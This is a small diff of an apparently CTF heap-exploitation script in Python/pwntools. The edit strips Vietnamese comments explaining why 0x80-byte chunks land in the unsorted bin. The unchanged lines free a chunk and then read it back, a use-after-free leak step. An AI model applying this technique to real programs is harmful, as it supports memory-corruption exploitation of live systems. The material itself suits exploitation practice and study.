@@ -31,9 +31,9 @@ def edit(index,data):
 	p.sendline(data)
 
 
-create(0, 0x80, b"1"*0x80) # tạo khối bộ nhớ có kích thước 0x80			do fastbin max = 0x80 bytes => free -> unsortedbin
-create(1, 0x80, b"2"*0x80) # tạo khối bộ nhớ có kích thước 0x80
-free(0) # giải phóng khối bộ nhớ vừa tạo
+create(0, 0x80, b"1"*0x80) 
+create(1, 0x80, b"2"*0x80)
+free(0)
 
 show(0)
 p.recvuntil(b"Data = ")
